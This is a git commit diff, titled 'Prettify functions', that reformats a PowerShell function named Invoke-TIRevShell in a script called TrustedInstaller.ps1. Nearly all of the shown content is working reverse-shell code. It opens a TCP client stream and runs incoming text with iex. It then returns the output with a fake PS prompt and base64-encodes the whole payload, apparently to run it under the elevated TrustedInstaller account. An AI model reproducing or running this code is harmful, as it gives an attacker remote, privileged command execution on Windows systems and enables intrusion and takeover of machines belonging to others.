656ee6338d3222f3e3f28a5dd52ff97425d4a31c
Kenny Strawn <Kenny.Strawn@gmail.com>
2024-12-09 12:17:11 -0800

    Prettify functions

--- TrustedInstaller.ps1
+++ TrustedInstaller.ps1
@@ -37,7 +37,8 @@ function Invoke-TIRevShell {
     $shell += ','
     $shell += ''
     $shell += $Port
-    $shell += ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS "'
+    $shell += ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'
+    $shell += '{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS "'
     $shell += ' + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
     $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
